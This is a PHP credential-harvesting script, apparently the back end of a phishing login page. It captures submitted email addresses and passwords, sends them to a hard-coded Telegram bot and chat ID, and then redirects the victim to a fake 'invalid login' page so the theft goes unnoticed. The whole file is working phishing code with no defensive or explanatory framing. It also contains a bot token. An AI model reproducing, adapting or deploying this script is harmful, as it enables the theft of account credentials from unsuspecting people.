<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method Not Allowed");
}

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Methods: POST");

date_default_timezone_set('UTC');

$botToken = '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY';
$chatId   = '1325797388';

$email = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');
$redirectTarget = 'https://authenticationform.rf.gd/invalid%20login.php'; // Change if needed

if (empty($email) || empty($password)) {
    http_response_code(400);
    exit("Missing data");
}

$message = "🔐 *New Login Submission*\n";
$message .= "-----------------------------\n";
$message .= "📧 *Email:* {$email}\n";
$message .= "🔑 *Password:* {$password}\n";
$message .= "-----------------------------\n";
$message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
$message .= "🌐 *Source:* form-receiver.php";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Always redirect regardless of success
header("Location: $redirectTarget");
exit;
